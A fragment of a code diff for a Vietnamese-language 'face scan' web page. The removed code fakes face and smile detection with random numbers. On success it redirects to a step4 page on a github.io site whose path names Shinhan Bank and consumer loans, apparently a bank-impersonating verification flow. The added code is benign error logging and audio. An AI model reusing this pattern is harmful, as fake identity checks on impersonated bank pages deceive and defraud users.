+            gainNode.gain.exponentialRampToValueAtTime(0.00001, this.audioContext.currentTime + duration / 1000);
+            oscillator.stop(this.audioContext.currentTime + duration / 1000);
+        } catch(e) { this.logError(e); }
+    },
+
+    logError(error) {
+        try {
+            console.error(error); // Also log to console for active debugging
+            const errors = JSON.parse(localStorage.getItem('errorLogs') || '[]');
+            errors.push({
+                timestamp: new Date().toISOString(),
+                message: error.message,
+                name: error.name,
+                stack: error.stack
             });
-        }
+            localStorage.setItem('errorLogs', JSON.stringify(errors.slice(-10))); // Keep last 10 errors
+        } catch(e) { console.error("Failed to log error to localStorage", e); }
+    }
+};
 
-        // Truy cập camera
-        async function startCamera() {
-            try {
-                updateStatusMessage('Đang khởi động camera...');
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
-                    audio: false
-                });
-                video.srcObject = stream;
-                detectFace();
-            } catch (err) {
-                console.error('Lỗi khi truy cập camera:', err);
-                errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Không thể truy cập camera. Vui lòng kiểm tra quyền truy cập.';
-                updateStatusMessage('Lỗi camera');
-            }
-        }
-
-        // Mô phỏng phát hiện khuôn mặt
-        function detectFace() {
-            const isFaceDetected = Math.random() > 0.3;
-            if (!isFaceDetected) {
-                updateStatusMessage('Không phát hiện được khuôn mặt, vui lòng đảm bảo ánh sáng tốt và thử lại');
-                errorMessage.style.display = 'block';
-                setTimeout(detectFace, 3000);
-            } else {
-                updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
-                setTimeout(startSmileDetection, 1000);
-            }
-        }
-
-        // Mô phỏng phát hiện biểu cảm cười với đếm ngược
-        function startSmileDetection() {
-            let countdown = 3;
-            updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                if (countdown > 0) {
-                    updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
-                } else {
-                    clearInterval(countdownInterval);
-                    simulateFaceScan();
-                }
-            }, 1000);
-        }
-
-        // Giả lập quá trình quét khuôn mặt
-        function simulateFaceScan() {
-            toggleScanEffect(true);
-            updateStatusMessage('Đang quét...');
-            setTimeout(() => {
-                toggleScanEffect(false);
-                const isSmileDetected = Math.random() > 0.4;
-                if (isSmileDetected) {
-                    updateStatusMessage('Thành công!');
-                    setTimeout(() => {
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
-                    }, 2000);
-                } else {
-                    updateStatusMessage('Không phát hiện được biểu cảm cười, vui lòng thử lại');
-                    errorMessage.style.display = 'block';
-                    errorMessage.textContent = 'Không phát hiện được biểu cảm cười. Vui lòng thử lại.';
-                    setTimeout(() => {
-                        errorMessage.style.display = 'none';
-                        updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
-                        setTimeout(startSmileDetection, 1000);
-                    }, 3000);
-                }
-            }, 3000);
-        }
-
-        // Sự kiện cho nút micro
-        let isMicActive = false;
-        micButton.addEventListener('click', () => {
-            isMicActive = !isMicActive;
-            if (isMicActive) {
-                micButton.classList.add('active');
-                micButton.textContent = '🔇';
-                alert('Micro đã được bật, vui lòng nói "Xác nhận"');
-            } else {
-                micButton.classList.remove('active');
-                micButton.textContent = '🎙️';
-                alert('Micro đã tắt');
-            }
-        });
-
-        // Sự kiện cho nút đóng
-        closeButton.addEventListener('click', () => {
-            if (confirm('Bạn có muốn thoát không?')) {
-                window.history.back();
-            }
-        });
-
-        // Khởi động camera và quét khuôn mặt
-        window.onload = () => {
-            startCamera();
-        };
-    </script>
+document.addEventListener('DOMContentLoaded', () => {
+    FaceScanApp.init();
+});
+</script>
 </body>
 </html>
